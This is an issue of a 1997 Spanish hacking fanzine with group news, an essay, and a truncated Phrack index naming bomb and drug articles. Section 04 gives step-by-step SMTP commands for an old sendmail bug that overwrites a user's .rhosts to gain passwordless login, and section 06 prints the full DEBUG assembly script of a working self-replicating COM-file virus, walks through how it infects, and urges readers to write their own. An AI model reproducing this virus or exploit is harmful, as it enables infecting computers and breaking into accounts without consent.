
ษอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
บ                       SAQUEADORES  Nง6  10-1-97                           บ
บ                             Segunda Epoca                                 บ
วฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤถ
บ                   Fanzine del underground informatico                     บ
ศอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ

ษอออออออออออออออออหอออออออออออออออออออออออออออออออออออออออออออออออออออออออออป 
บ  Disponible en  บ  http://www.geocities.com/SiliconValley/park/7574/      บ
บ                 บ  http://iberhack.ml.org                                 บ   
บ                 บ  http://www.geocities.com/SiliconValley/Park/7479/      บ
บ                 บ  Gorth BBS                                              บ
บ                 บ  DarkHate BBS   2 nodos   Telf (972) 27 44 64           บ
ศอออออออออออออออออสอออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ
ษอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
บ Todos los contenidos de esta revista son solamente educativos, ninguno    บ
บ pretende incitar al crimen o a la ilegalidad. Cualquier uso erroneo de    บ
บ esta informacion no es responsabilidad nuestra. Asi mismo, no nos hacemos บ                                                             
บ responsables de las informaciones u opiniones de nuestros colaboradores   บ                                                             
บ o informadores.                                                           บ
ศอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ




"There's no time for us,
there's no place for us"
                       
                       Who want to live forever




ษอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
บ 01. CONTENIDOS                                                            บ
ศอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ


Nง__Titulo/Autor___________________________________Tema_________Nivel tecnico_

01. Contenidos                                     Saqueadores numero 6

02. Presentacion                                   Saqueadores numero 6

03. Renovacion del grupo y de la revista           Noticias de la reunion

04. El bug del mes / por Dark Raver                Hackin       Medio-alto

05. Mensaje de Eljaker                             Despedida

06. Introduccion a la programacion de Virus        Virus        Medio
por Episiarca 

07. Indice de la revista Phrack #1-31              Publicaciones en ingles

08. Curso de hacking empezando desde cero II       Hackin       Bajo
por el Duke

09. Avisos, peticiones, etc...                     Variado

10. Fallos, erratas y correcciones                 Revision

11. El divertido mundo de los virus                Virus        Medio
por Polimorph

12. Despedida                                      Otra despedida




ษอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
บ 02. PRESENTACION                                                          บ
ศอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ


Hola amigos, aqui estamos otra vez, cargados de novedades y de noticias.
Yo sigo haciendo de editor-temporal, hasta que los cambios del grupo
terminen de cuajar.

Los cambios, como podreis comprobar mas adelante, son radicales. Pero no
os preocupeis la revista seguira existiendo y seguira tratando temas de
interes general.

Para que os entereis de lo que se avecina, aqui teneis un resumen.

                                                        El Duke de Sicilia




ษอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
บ 03. RENOVACION DEL GRUPO Y DE LA REVISTA                                  บ
ศอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ


Despues de algunas reuniones y muchos mensajes asi queda el grupo y la
revista. 


Decisiones sobre el grupo:
--------------------------

-Las modificaciones en el grupo no son muy grandes. Se aceptan algunos
miembros nuevos y se descentraliza la accion.
-Se hace mas facil entrar en el grupo, y se elimina cualquier tipo de
jerarquia.
-Cualquiera que nos ofrezca informacion de interes, sera aceptado en el
grupo y recibira informacion extra y los nuevos numeros de la
revista. (Si tardamos un poco no os preocupeis, la burocracia siempre
es lenta :-)


Decisiones sobre la revista:
----------------------------

-La revista seguira sin fecha fija de salida, aunque intentaremos que
sea aproximadamente bi-mensual.
-Viendo que la revista ya ha alcanzado su madurez, hemos decidido darle
un estilo mas tecnico y menos infantil. 
-Se seguiran tratando temas de iniciacion, pero seran menos. Aunque todo
depende de lo que nos pida el publico.
-En la revista tambien se incluiran textos tecnicos, aunque no tengan
relacion directa con temas under.
-Se incluiran articulos de opinion, aunque sin abusar.
-Hemos decidido no ofrecer datos demasiado concretos o peligrosos. La 
informacion de esta publicacion no debe ser usada para delinquir, nuestro 
objetivo es simplemente enseคaros a pensar por vosotros mismos. 
-Ningun componente del grupo dara listas de sites warez, password o
informacion sobre hacking, a alguien en particular, a menos que sea un caso 
excepcional.
-En cambio si que se INTERCAMBIARA informacion de interes y se aceptaran
trabajos por encargo, siempre que merezcan la pena.
-En la revista no se incluiran programas, ni imagenes, excepto en casos
extraordinarios.
-El formato seguira siendo texto, sin acentos ni caracteres especiales,
por ser el sistema mas estandar y extendido. Se usara el juego de
caracteres estandar ASCII.
-El nombre de la publicacion pasa a ser SET (Saqueadores Edicion Tecnica)
para diferenciarla del grupo.
-Los expedientes secretos dejaran de existir.
-Como el gran hermano se ha fijado en nosotros, y nos lee habitualmente, 
hemos decidido ser buenos y no meternos con nadie. (En publico, porque en
privado seguiremos haciendo travesuras)
-La revista tratara mayoritariamente temas de hacking, aunque sin olvidar
el resto de temas under.

Espero que no os hayais asustado con los cambios, pero la mayoria de ellos
eran inevitables. Si no estais de acuerdo con algo solo teneis que decirlo
y si nos convenceis tal vez os hagamos caso.

                                                                el grupo




ษอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
บ 04. EL BUG DEL MES                                                        บ
ศอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ


Saludos amigos, aqui esta para serviros y para comentaros el bug de este
mes el Dark Raver. Como no os sonara mi nombre, os dire que soy un fanatico
de los ordenatas y por supuesto del hacking, que me podreis encontrar en 
Axis y que es la primera vez que escribo en esta super publicacion, y no es 
por peloteo :-)

Me han dejado libertad, para elegir el bug de este mes, pero me han dicho
que no me porte mal }:-) Es una pena, pero habra que aguantarse. Por 
eso he decidido continuar con lo que hizo Red en el numero anterior y
os voy a explicar otro bug clasico del sendmail.

Este bug es un poco mas moderno, que el que explico Red, y a lo mejor todavia
funciona en algun sitio, pero no os hagais ilusiones.


Sistemas: Unix's en general 
Versiones: Sendmail, versiones anteriores a la 5.59
Descripcion: Bug del sendmail

Con este bug, los usuarios externos pueden sobre-escribir cualquier archivo,
que no tenga nivel de root.

Ejemplo: (No voy a poner ejemplos de sistemas operativos concretos. Intentare
esplicarme lo mas generalmente posible, y luego vosotros tendreis que 
aplicarlo a vustro sistema en concreto.)

Hacemos un telnet a victima.com al puerto 25

rcpt to: /home/pepe/.rhosts   -->   Nombre (y situacion) del fichero a 
                              escribir. En este caso vamos a sobre-escribir
                              el rhosts del usuario llamado pepe.

mail from: pepe

data

"Aqui pon lo que quieras, un comentario para el root por ejemplo :-)"

.   -->   Normalmente te dara un mensaje de error, despues de poner
          el punto.

rcpt to: /home/pepe/.rhosts   -->   Esto es muy importante, hay que hacerlo
                                    2 veces.
mail from: pepe

data   -->   Ahora en este segundo intento si que podras escribir en el 
             fichero.

mi.ordenador.com   -->   Esto es lo que se escribira en el archivo. Tambien se
                         podria poner ' + + ' o algo similar.

.   -->   Si no da mensaje de error es que ha funcionado.

quit


Despues hacemos un rlogin a victima.com como si fuesemos pepe, y como
el nombre de nuestro ordenador, aparece en su .rhosts (remote hosts) 
entraremos sin problemas, ya que no nos pedira el pass.
         
Para comprender este texto, es necesario, tener un nivel medio en el manejo
de sistemas unix. Si no has comprendido algo, mirate un manual sobre unix,
o instalate el linux en tu pc y practica un poco. Seguro que si lo haces
este fichero te parecera cosa de niคos.

                                                        Dark Raver




ษอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
บ 05. MENSAJE DE ELJAKER                                                    บ
ศอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ


Antes de que os asusteis quiero decir, que esto no es un adios definitivo,
simplemente es un descanso que necesitaba. Es una retirada temporal de
la vida activa, pero seguire con la teoria y por supuesto seguire
escribiendo articulos en la revista, aunque intentare que sean menos  
numerosos pero mas jugosos. A si que tened paciencia, y dentro de un par de 
meses volvereis a ver articulos mios por aqui.

Y ya que me despido (Temporalmente) quiero aprovechar para soltar el tipico
rollo que se cuenta cuando uno se retira, y unas cuantas ideas que me
estaban rondando por la mente y que estaba deseando decir.

Cuando hace unos meses inicie la publicacion, practicamente en solitario y 
luego con un par de amigos, el hacking hispano estaba muerto, a pesar
del tiron de internet y del gran numero de gente con modem, esto parecia
que no avanzaba. Aunque habia un par de grupillos mal organizados, no
habia casi documentos en nuestra lengua y (que yo sepa) no habia
ninguna publicacion espaคola. Es una verguenza, incluso paises como
Uruguay o Argentina, nos llevaban una ventaja de varios aคos en estos
temas. Aqui en Espaคa habia un par de bbs y poca cosa mas. Ahora despues
de unos meses, parece que la semilla que plantamos empieza a crecer,
ya hay varias publicaciones mas, los canales del irc sobre hacking
en espaคol estan llenos, en las areas de mensajeria se empieza a hablar
en serio, hay montones de paginas sobre hacking en espaคol.

No quiero llevarme todos los honores, porque me han ayudado mucho. 
Me basta con las felicitaciones de unos cuantos y con la contemplacion
del maravilloso panorama que presenta el mundo hacker espaคol, que
aunque todavia le queda mucho que mejorar, esta en una fase gloriosa
que seguramente nunca se volvera a repetir.

Tambien quiero pedir perdon a aquellos administradores, a los que esta
publicacion ha perjudicado. Aunque bien mirado, la escalada hacker
mas bien os beneficia, ya que aumentan los puestos de trabajo, los
empresarios empezaran a gastarse mas dinero en seguridad y por lo
tanto vuestro trabajo sera mas reconicido y por supuesto, algunos
hackers, entre los que me incluyo, somos tan buenazos, que incluso
os dejamos mensajillos avisando de los agujeros de vuestro sistemas,
que mas se puede pedir. Ya se que hay por ahi algunos chavales, algo
tontos que se entretienen formateando discos duros, pero esa minoria
no tenia por que ser porblema para vosotros, porque son realmente la
clase mas baja de hackers y nunca llegaran a nada.

Y con esto no quiero molestar a nadie, pero la verdad es que este tipo
de actitudes no benefician a nadie, ni al autor ni al mundo hacker,
mas bien empeora nuetra fama y nos equipara con delincuentes. 

Ya se que la publicacion no ha sido muy brillante, que le nivel tecnico
ha sido algo bajo y que los primeros numeros fueron algo infantiles,
pero por algo habia que empezar, y ahora el tiempo nos esta dando la
razon y parece que los contenidos tecnicos van en aumento y que
empiezan a salir a la luz excelentes colaboradores. Todavia nos queda
mucho por mejorar, para llegar al nivel de las revista americanas,
pero si seguimos asi, no tardaremos mucho en hacerlo.

Y bueno, todavia me quedan muchas cosas que decir, pero me parece que
me estoy pasando, a si que voy a cortar ya.

Estamos dentro

                                                        Eljaker




ษอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
บ 06. INTRODUCCION A LA PROGRAMACION DE VIRUS                               บ
ศอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ


Hola, soy Episiarca y voy a introducir un poco el tema de la programacion de
virus para aquellos que no saben mucho sobre ensamblador y Virus.

Los Virus se programan en ensamblador, por eso mismo es necesario un
conocimiento minimo de este lenguaje. Por ahora es suficiente con conocer las
instrucciones basicas como las de salto, comparacion y movimiento de datos.

Todo el mundo sabe lo que es un Virus, pero veamos uno por dentro :-). El
primer virus lo vi en una revista ya desaparecida, Amstrad User. Ellos
publicaron un pequeคo Virus que luego seria conocido como el Virus Amstrad, al
parecer intentaron colarlo en los ordenadores de la revista :-?. Por cierto, el
Virus es de lo mas tonto, solo lo voy a utilizar como ejemplo, pero es muy malo
como Virus, no restaura la fecha del fichero, no comprueba los atributos de
lectura/escritura, no mira si el tamaคo del fichero es muy grande ... El script
original contenia un error, el que voy a poner es correcto. Para obtener un
fichero ejecutable basta con poner:

DEBUG < V1RV.DBG

---------------------------------------------------------------------------
a
JMP     0116
NOP
DEC     CX
PUSH    SI
ADD     [BP+SI],CH
CS:
INC     BX
DEC     DI
DEC     BP
ADD     [BX+04],CL
ADD     [BX+SI],AL
ADD     [BX+SI],AX
ADD     [BX+SI],AL
ADD     [BX+SI],AL
MOV     AX,CS
ADD     AX,1000
MOV     ES,AX
INC     BYTE PTR [0105]
MOV     SI,0100
XOR     DI,DI
MOV     CX,014F
REPZ
MOVSB
MOV     DX,025F
MOV     AH,1A
INT     21
MOV     DX,0106
MOV     CX,0016
MOV     AH,4E
INT     21
JB      019E
MOV     DX,027D
MOV     AX,3D02
INT     21
MOV     [0114],AX
MOV     BX,AX
PUSH    ES
POP     DS
MOV     DX,034F
MOV     CX,FFFF
MOV     AH,3F
INT     21
ADD     AX,034F
CS:
MOV     [0112],AX
DS:
CMP     WORD PTR [0352],5649
JZ      0188
XOR     CX,CX
MOV     DX,CX
CS:
MOV     BX,[0114]
MOV     AX,4200
INT     21
JB      0188
MOV     DX,0000
CS:
MOV     CX,[0112]
CS:
MOV     BX,[0114]
MOV     AH,40
INT     21
CS:
MOV     BX,[0114]
MOV     AH,3E
INT     21
PUSH    CS
POP     DS
MOV     AH,4F
MOV     DX,025F
INT     21
JB      019E
JMP     013E
MOV     DX,0080
MOV     AH,1A
INT     21
CMP     BYTE PTR [0105],05
JB      0207
MOV     AX,0040
MOV     DS,AX
MOV     AX,[006C]
PUSH    CS
POP     DS
AND     AX,0001
JZ      0207
MOV     DX,01C4
MOV     AH,09
INT     21
INT     20
INC     BP
DB      6E
AND     [SI+75],DH
AND     [BX+SI+43],DL
AND     [BX+SI+61],CH
JNS     01F1
JNZ     0241
AND     [BP+69],DH
JB      024D
JNB     01FA
PUSH    DX
PUSH    SI
XOR     [SI],BP
AND     [BX+DI+20],BH
XOR     BYTE PTR [BP+DI+74],61
AND     [DI+73],AH
AND     [BP+DI+75],DH
AND     [BX+DI+75],DH
DB      69
DB      6E
JZ      0253
AND     [BX+65],AH
DB      6E
DB      65
JB      025A
DB      63
DB      69
MOV     [206E],AL
ADD     [BX+SI],SP
AND     [BX+SI],AH
AND     [BX+SI],AH
OR      CL,[DI]
AND     AL,BE
AND     AL,02
MOV     CX,002B
XOR     DI,DI
REPZ
MOVSB
XOR     DI,DI
CS:
MOV     WORD PTR [010E],0000
CS:
MOV     [0110],ES
CS:
JMP     FAR [010E]
PUSH    DS
POP     ES
MOV     SI,044F
CMP     BYTE PTR [0105],01
JNZ     0234
SUB     SI,0200
MOV     DI,0100
MOV     CX,FFFF
SUB     CX,SI
REPZ
MOVSB
CS:
MOV     WORD PTR [0100],0100
CS:
MOV     [0102],DS
CS:
JMP     FAR [0100]
INT     20

n v1rv.com
r cx
151
w
q
---------------------------------------------------------------------------

Lo mejor que puedes hacer ahora es ejecutar el Virus paso a paso con el propio
DEBUG. Ejecuta el DEBUG, cuando salga el cursor (-) indicale el nombre del
fichero a cargar (n v1rv.com) y leelo (l). En el registro BX,CX tienes el
tamaคo en bytes del programa cargado, para ver el contenido de los registros
utiliza el comando (r). Fijate que BX vale 0000 y CX vale 0151, es decir, el
tamaคo del programa es de 337 bytes (el valor de CX esta en hexa).

Utilizaremos las ordenes (t) y (p) para tracear el Virus, la diferencia entre
(t) y (p) es que la primera ejecuta el programa instruccion a instruccion,
metiendose dentro de las CALL y de las INT, mientras que (p) ejecuta de un
golpe las CALL y las INT. Para una instruccion cualquiera (exceptuado CALL/INT)
las dos ordenes se pueden usar indistintamente.

Empecemos con la (p), se ha producido un salto a la direccion 116 (en hexa).

        JMP 116
        ... ...
116:    MOV     AX,CS
        ADD     AX,1000
        MOV     ES,AX
        INC     BYTE PTR [0105]
        MOV     SI,0100
        XOR     DI,DI
        MOV     CX,014F
        REPZ
        MOVSB

Las tres primeras instrucciones tras el salto ponen en ES la direccion del
segmento que dista 64Kb del actual. Espero que comprendas esto :-)), si no es
que hay que pegar un repaso a la segmentacion de los procesadores Intel.

* REPASO: Los procesadores Intel utilizan un esquema basado en la segmentacion
* para direccionar la memoria. El esquema Intel es diferente a la segmentacion
* clasica. Cada semento es de 64Kb, pero no estan de forma consecutiva en la
* memoria, estan sobrelapados, distando cada comienzo de segmento un parrafo
* (16 bytes). Es decir, si tenemos una direccion SEG:OFF, el siguiente segmento
* comienza en (SEG+01h):OFF o en SEG:(OFF+10h). Date cuenta que lienalmente es
* la misma direccion: (SEG+01h)*10h+OFF = SEG*10h+10h+OFF = SEG*10h+(OFF+10h) 
* = SEG:(OFF+10h).
* Bueno... seguro que sabes que la direccion segmentada se pasa a lineal si
* multiplicas el segmento por 16 (10h) y le sumas el desplazamiento.

La cuarta incrementa un contador, simplemente recuerda por ahora que esta en la
direccion DS:0105h, luevo veremos para que lo usa.

El resto, 5 instrucciones, copian el virus en el segmento calculado. La
instruccion REPZ MOVSB copia CX bytes desde DS:SI a ES:DI. Como DS apunta al
mismo segmento que CS y SI vale 100h, estamos compiando CS:100h que es la
direccion del principio del Virus. El registro CX vale 14fh, es decir, el
tamaคo del Virus, ya que los dos ultimos bytes (CDh 20h) corresponden al codigo
del programa que hemos infectado. La direccion de destino es ES:DI, el valor de
ES es conocido, DI vale 0000h.

Pasamos a ver las 3 siguientes.

        MOV     DX,025F
        MOV     AH,1A
        INT     21

Esta es una interrupcion 21h con servicio 1ah, para saber que significa podemos
consultar las listas de Ralf Brown. Este servicio se encarga de establecer la
direccion del DTA en DS:DX. El DTA es una zona de memoria que por defecto se
encuentra en DS:0080h (PSP), se usa como registro para contener informacion que
devuelven otros servicios, como el de buscar ficheros por un directorio.
El tamaคo maximo del DTA va a ser de 128 bytes... un momento... ahora estamos
estableciendo una zona de memoria que va ha ser escrita por otros servicios en
la direccion DS:025fh 8-O !!!, ญ pero si en esa direccion puede existir parte
del programa infectado !, XDD, tranqui, ya veremos como solucionar esto.

        MOV     DX,0106
        MOV     CX,0016
        MOV     AH,4E
        INT     21
        JB      019E

Esta funcion hace uso del DTA, es la encargada de buscar ficheros, junto a su
hermana el servicio 4fh. Veamos, en CX espera los atributos para la busqueda,
su patron es el siguiente:

        76543210
        00XXXXXX

El 7 y 6 estan reservados, 5 es el bit de archivo, 4 de subdirectorio, el bit 3
es el de la etiqueta de volumen, el 2 archivo de sistema, 1 archivo oculto y 0
el de solo lectura. Pues bien, el servicio 4eh pide que especifiquemos que
atributos debe tener los ficheros que vamos a buscar, 16h en binario es 10110,
es decir, busca los ficheros ocultos, de sistema y subdirectorios, aparte de
los normales. [ Yo considero que buscar los subdirectorios es un error del
programa, ya que no hay uso de los servicios de directorio ].

En DS:DX se debe almacenar el patron de busqueda en una cadena ASCIIZ (termina
en 00h). Para ver el patron que usa pongamos (d ds:106)... :-) '*.COM',00h. Si
no encuentra ninguno devuelve el bit del carry a 1, el programa salta a 019eh.

El servicio 4eh/4fh almacena en la DTA la siguiente info:

        Bytes           Finalidad
        -----           ---------
        0-20            Reservados
        21              Atributo del fichero
        22-23           Hora del fichero:
                          Bits 0bh-0fh = horas (0-23)
                          Bits 05h-0ah = minutos (0-59)
                          Bits 00h-04h = incrementos de 2 segundos (0-29)
        24-25           Fecha de fichero:
                          Bits 09h-0fh = aคo (respecto a 1980)
                          Bits 05h-08h = mes (1-12)
                          Bits 00h-04h = dia (1-31)
        26-29           Tamaคo del fichero
        30-42           Nombre y extension en ASCIIZ

Bien, supongamos que encuentra un fichero '*.COM', en ese caso ejecutaria la
siguiente seccion de codigo:

        MOV     DX,027D
        MOV     AX,3D02
        INT     21
        MOV     [0114],AX
        MOV     BX,AX

Es decir, abre el fichero de nombre DS:DX para lectura/escritura. Como ves, DX
apunta a la zona del DTA referente al nombre del fichero :-). A la vuelta, este
servicio pone en AX el file-handle del fichero, lo guarda en DS:0114h y lo pone
en BX.

        PUSH    ES
        POP     DS
        MOV     DX,034F
        MOV     CX,FFFF
        MOV     AH,3F
        INT     21
        ADD     AX,034F
        CS:
        MOV     [0112],AX

Las dos primeras instrucciones ponen DS igual a ES y a continuacion lee todo el
fichero COM en DS:DX. Pone el codigo del programa al final del Virus, dejando
0200h bytes de espacio. Precisamente este espacio lo deja el Virus para poder
almacenar la DTA en la siguiente infeccion.

El numero de bytes leido se devuelve en AX, valor al que le suma 034fh, que es
el tamaคo del virus mas esos 0200h. El tamaคo total lo almacena en CS:0112h.

        DS:
        CMP     WORD PTR [0352],5649
        JZ      0188

El Virus, para no reinfectar un programa, mira el cuarto y el quinto byte, si
valen I y V respectivamente quiere decir que el programa ya tenia el Virus y no
lo infecta otra vez.

        XOR     CX,CX
        MOV     DX,CX
        CS:
        MOV     BX,[0114]
        MOV     AX,4200
        INT     21
        JB      0188

Este trozo hace que el puntero de lectura/escritura del fichero apunte de nuevo
al principio del mismo, ya que reescriviremos todo el programa. Recuerda que en
la direccion 0114h tenemos el file-handle del fichero.

        MOV     DX,0000
        CS:
        MOV     CX,[0112]
        CS:
        MOV     BX,[0114]
        MOV     AH,40
        INT     21
        CS:
        MOV     BX,[0114]
        MOV     AH,3E
        INT     21

Aqui esta la verdadera infeccion :-), escribe el fichero desde el principio con
el nuevo tamaคo y al final lo cierra. Ahora ya tenemos el programa infectado,
pasemos al siguiente :-).

        PUSH    CS
        POP     DS
        MOV     AH,4F
        MOV     DX,025F
        INT     21
        JB      019E
        JMP     013E

Esto restaura el valor de DS, para que apunte a CS. Luego continua la busqueda
de los ficheros (4fh). Curioso error, pone en DX el valor 025fh que es donde se
encuentra la DTA, pero eso no hace falta (tonto, desperdicia preciosos bytes).

Si encuentra algun otro fichero salta a la direccion 013eh y comienza de nuevo
todo el proceso, si no encuentra mas fichero salta a la 019eh.

        MOV     DX,0080
        MOV     AH,1A
        INT     21

Si no encuentra mas ficheros reestablece la direccion de la DTA. Esto es
importante.

        CMP     BYTE PTR [0105],05
        JB      0207
        MOV     AX,0040
        MOV     DS,AX
        MOV     AX,[006C]
        PUSH    CS
        POP     DS
        AND     AX,0001
        JZ      0207
        MOV     DX,01C4
        MOV     AH,09
        INT     21
        INT     20

จRecuerdas que al principio el Virus incremento el byte de la 0105h?, es un
contador de reproducciones, indica cuantas veces se ha reproducido el Virus.
Ahora lo compara con 5, si es menor no hace nada, pero si es igual o mayor mira
el bit 0 del contador de clicks del sistema (0040h:006ch), si vale 1 imprime un
mensajito muy tonto, para verlo pon (d1c4), dice lo siguiente: 'En tu PC hay un
virus RV1, y esta es su quinta generacion', acompaคado del caracter 01h (una
carita), al final sale al DOS.

        MOV     SI,0224
        MOV     CX,002B
        XOR     DI,DI
        REPZ
        MOVSB
        XOR     DI,DI
        CS:
        MOV     WORD PTR [010E],0000
        CS:
        MOV     [0110],ES
        CS:
        JMP     FAR [010E]

Ya estamos cerca del final, desde ahora el Virus se va a encargar de preparar
la memoria para poder ejecutar el programa que tiene adosado. Para ello copia
un mini programa de 2bh bytes, que comienza en cs:0224, al principio del nuevo
segmento. Por ultimo pega un salto a ES:0000h, es decir, al mini programa.

        PUSH    DS
        POP     ES
        MOV     SI,044F
        CMP     BYTE PTR [0105],01
        JNZ     0234
        SUB     SI,0200
        MOV     DI,0100
        MOV     CX,FFFF
        SUB     CX,SI
        REPZ
        MOVSB
        CS:
        MOV     WORD PTR [0100],0100
        CS:
        MOV     [0102],DS
        CS:
        JMP     FAR [0100]

Este es el programa que pasa a ejecutar. Primero iguala los registros de datos
y extra con el de codigo. Ahora viene un detalle que me hace sospechar que los
programadores del virus fueron los de la revista: ajusta SI dependiendo de si
es su primera reproduccion o no (en la revista publicaron uno en su primera
reproduccion, es decir, nunca se habia reproducido). Lo principal de este trozo
es que copia el codigo del programa infectado al principio del segmento, 0100h,
y salta a la primera instruccion del programa. Este se ejecuta como si nada.

Bueno esto es todo. Hemos analizado con detenimiento un Virus muy simple y con
fallos en su programacion. Existe otra tecnica para infectar programa COM que
con un poco de suerte la podremos ver en otra entrega. Infectar los EXE no es
mucho mas dificil :-).

Por ultimo, no me seais lamerillos y si programais un Virus hacedlo desde el
principio, no os conformeis con arreglar este fuente }:-).

                                                                Episiarca




ษอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
บ 07. INDICE DE LA REVISTA PHRACK #1-31                                     บ
ศอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ


Viendo la buena acogida, que tuvo esta nueva seccion en el numero anterior
hemos decidido volver a dedicarle este apartado a la Phrack, ahora con un
indice de los numeros 1 al 31, tal vez sean un poco antiguos, pero siempre
son utiles.


          Index to Phracks #1 - 31 
              Compiled by AREXX
  
                  Phrack #1
  
1  This Introduction to Phrack Inc. by Taran King
2  SAM Security Article by Spitfire Hacker
3  Boot Tracing on Apple by Cheap Shades
4  The Fone Phreak's Revenge by Iron Soldier
5  MCI International Cards by Knight Lightning
6  How to Pick Master Locks by Gin Fizz and Ninja NYC
7  How to Make an Acetylene Bomb by The Clashmaster
8  School/College Computer Dial-Ups by Phantom Phreaker
  
                  Phrack #2

1  Phrack Inc. Index  - Taran King
2  Prevention of the Billing Office Blues - Forest Ranger
3  Homemade Guns - Man-Tooth
4  Blowguns - The Pyro
5  TAC Info 
6  Universal Informational Services via ISDN - Taran King
7  MCI Overview - Knight Lightning
8  Hacking RSTS - Data Line
9  Phreak World News - Knight Lightning
 
                  Phrack #3

1  Index written by Cheap Shades
2  Rolm systems written by Monty Python
3  Making shell bombs written by Man-Tooth
4  Signalling systems around the world by Data Line
5  Private audience written by Overlord
6  Fortell systems written by Phantom Phreaker
7  Eavesdropping written by Circle Lord
8  Building a Shock Rod written by Circle Lord
9  Introduction to PBX's written by Knight Lightning
10 Phreak World News II written by Knight Lightning
         
                  Phrack #4

1  Phreak Pro-Phile I 
2  Ring Back Codes for the 314 NPA
3  False Identification
4  Profile of MAX long distance service
5  Breaching and clearing obstacles
6  Creashing DEC-10's
7  Centrex Renaissance "The Regulations"
8  The Tried and True Home Production Method for Methamphetamine
9-11  Phrack World News 
         
                  Phrack #5

1  Phrack V Intro by Taran King
2  Phrack Pro-Phile of Broadway Hacker by Taran King
3  Hacking Dec's by Carrier Culprit
4  Hand to Hand Combat by Bad Boy in Black
5  DMS-100 by Knight Lightning
6  Bolt Bombs by The Leftist
7  Wide Area Networks Part 1 by Jester Sluggo
8  Radio Hacking by The Seker
9  Mobile Telephone Communications by Phantom Phreaker
10-12  Phrack World News IV by Knight Lightning
         
                  Phrack #6

1  Index by Taran King (1k)
2  Pro-Phile on Groups by Knight Lightning (14k)
3  The Technical Revolution by Dr. Crash (4k)
4  Fun with Lighters by The Leftist (2k)
5  Nasty Unix Tricks by Shooting Shark (4k)
6  Smoke Bombs by Alpine Kracker (2k)
7  Cellular Telephones by High Evolutionary (5k)
8  Wide Area Networks by Jester Sluggo (10k)
9-13 Phrack World News by Knight Lightning (16,15,15,16,15K)
         
                  Phrack #7

1  Intro/Index by Taran King (2175 bytes)
2  Phrack Pro-Phile of Scan Man by Taran King (7133 bytes)
3  Hacker's Manifesto by The Mentor (3561 bytes)
4  Hacking Chilton's Credimatic by Ryche (7758 bytes)
5  Hacking RSTS Part 1 by The Seker (11701 bytes)
6  How to Make TNT by The Radical Rocker (2257 bytes)
7  Trojan Horses in Unix by Shooting Shark (12531 bytes)
8  Phrack World News VI Part 1 by Knight Lightning (15362 bytes)
9  Phrack World News VI Part 2 by Knight Lightning (16622 bytes)
10 Phrack World News VI Part 3 by Knight Lightning (16573 bytes)
         
                  Phrack #8

1  Phrack Inc. Index by Taran King (1k)
2  Phrack Pro-Phile V on Tuc by Taran King (6k)
3  City-Wide Centrex by The Executioner (14k)
4  The Integrated Services Digital Network by Dr. Doom (18k)
5  The Art of Junction Box Modeming by Mad Hacker 616 (6k)
6  Compuserve Info by Morgoth and Lotus (8k)
7  Fun with Automatic Tellers by The Mentor (7k)
8  Phrack World News VII Part I by Knight Lightning (25k)
9  Phrack World News VII Part II by Knight Lightning (26k)
         
                  Phrack #9

1  Introduction to Phrack Inc. Issue Nine by Taran King (1.4K)
2  Phrack Pro-Phile on The Nightstalker by Taran King (6.4K)
3  Fun With the Centagram VMS Network by Oryan Quest (3.9K)
4  Programming RSTS/E File2: Editors by Solid State (12.9K)
5  Inside Dialog by Ctrl C (8.4K)
6  Plant Measurement by The Executioner (12.8K)
7  Multi-User Chat Program for DEC-10's by TTY-Man and The Mentor (6.5K)
8  Introduction to Videoconferencing by Knight Lightning (10.5K)
9  Loop Maintenance Operations System by Phantom Phreaker and Doom Prophet
    (17.2K)
10 Phrack World News VIII by Knight Lightning (16.3K)

                  Phrack #10

1  Introduction to Phrack 10 by Taran King (2.2k)
2  Pro-Phile on Dave Starr by Taran King (7.5k)
3  The TMC Primer by Cap'n Crax (6.1k)
4  A Beginner's Guide to the IBM VM/370 by Elric of Imrryr (3.5k)
5  Circuit Switched Digital Capability by The Executioner (11.9k)
6  Hacking Primos Part I by Evil Jay (10.9k)
7  Automatic Number Identification by Phantom Phreaker and Doom Prophet
                                                                       (9.2k)
8  Phrack World News 9 Part I by Knight Lightning (22.7k)
9  Phrack World News 9 Part II by Knight Lightning (14.8k)
        
                  Phrack #11

1  Index to Phrack Eleven by Taran King (1.7K)
2  Phrack Pro-Phile VIII on Wizard of Arpanet by Taran King (6.8K)
3  PACT: Prefix Access Code Translator by The Executioner (7.6K)
4  Hacking Voice Mail Systems by Black Knight from 713 (6.0K)
5  Simple Data Encryption or Digital Electronics 101 by The Leftist (4.1K)
6  AIS - Automatic Intercept System by Taran King (15.9K)
7  Hacking Primos I, II, III by Evil Jay (6.7K)
8  Telephone Signalling Methods by Doom Prophet (7.3K)
9  Cellular Spoofing By Electronic Serial Numbers donated by Amadeus (15.2K)
10 Busy Line Verification by Phantom Phreaker (10.0K)
11 Phrack World News X by Knight Lightning
12 Phrack World News XI by knight Lightning
        
                  Phrack #12

1  Index of Phrack 12 by Taran King (2.3 k)
2  Pro-Phile IX on Agrajag The Prolonged by Taran King (6.7 k)
